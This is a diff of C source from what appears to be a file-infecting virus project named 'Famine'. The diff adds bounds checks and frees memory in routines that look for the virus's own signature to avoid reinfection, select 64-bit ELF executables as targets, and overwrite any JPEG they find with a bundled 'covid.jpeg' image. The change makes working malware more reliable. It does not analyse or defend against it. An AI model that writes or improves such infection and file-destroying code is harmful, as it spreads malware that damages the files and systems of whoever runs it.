@@ -29,7 +29,7 @@ int copy_file(t_woody *woody, char *filename)
 	char *string = woody->addr;
 	for (int i = 0; i < woody->filesize; i++)
 	{
-		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 53) != NULL)
+		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 52) != NULL)
 		{
 			return ERROR_CODE;
 		}
@@ -49,36 +49,46 @@ void do_replace_image(char *filename, char *path)
 	char *rpath = NULL;
     rpath = realpath(path, rpath);
 	*ft_strrchr(rpath, '/') = '\0';
-	rpath = ft_strjoin(rpath, "/static/covid.jpeg");
+	char *new_path = ft_strjoin(rpath, "/static/covid.jpeg");
 	
-	input = fopen(rpath, "rb");
+	input = fopen(new_path, "rb");
 	output = fopen(filename, "wb");
 	while (nread = fread(buffer, sizeof(char), sizeof(buffer), input)){
 		fwrite(buffer, sizeof(char), nread, output);
 	}
+
+	free(rpath);
+	free(new_path);
+	fclose(input);
+	fclose(output);
 }
 
-int check_fileformat(unsigned char *c, char *filename, char *path)
+int check_fileformat(unsigned char *c, char *filename, char *path, ssize_t filesize)
 {
 
-	if (c[0] == 0x7f &&
+	if (filesize > 16 &&
+		c[0] == 0x7f &&
 		c[1] == 'E' &&
 		c[2] == 'L' &&
 		c[3] == 'F' &&
 		c[4] == ELFCLASS64 &&
 		(c[16] == ET_EXEC || c[16] == ET_DYN))
 	{
+		free(filename);
 		return 0;
 	}
-	else if (c[0] == 0xFF &&
-			 c[1] == 0xD8 &&
-			 c[2] == 0xFF)
+	else if (filesize > 3 &&
+			c[0] == 0xFF &&
+			c[1] == 0xD8 &&
+			c[2] == 0xFF)
 	{
 		do_replace_image(filename, path);
+		free(filename);
 		return ERROR_CODE;
 	}
 	else
 	{
+		free(filename);
 		return ERROR_CODE;
 	}
 }
@@ -88,6 +98,7 @@ int read_elf_file_bonus(t_woody *woody, char *filename, char *path)
 	woody->filesize = get_file_size(filename);
 	if (woody->filesize == ERROR_CODE)
 	{
+		free(filename);
 		return ERROR_CODE;
 	}
 
@@ -95,12 +106,14 @@ int read_elf_file_bonus(t_woody *woody, char *filename, char *path)
 	woody->addr = malloc(woody->filesize);
 	if (woody->addr == NULL)
 	{
+		free(filename);
 		return ERROR_CODE;
 	}
 
 	if (copy_file(woody, filename) == ERROR_CODE)
 	{
+		free(filename);
 		return ERROR_CODE;
 	}
-	return check_fileformat(woody->addr, filename, path);
+	return check_fileformat(woody->addr, filename, path, woody->filesize);
 }
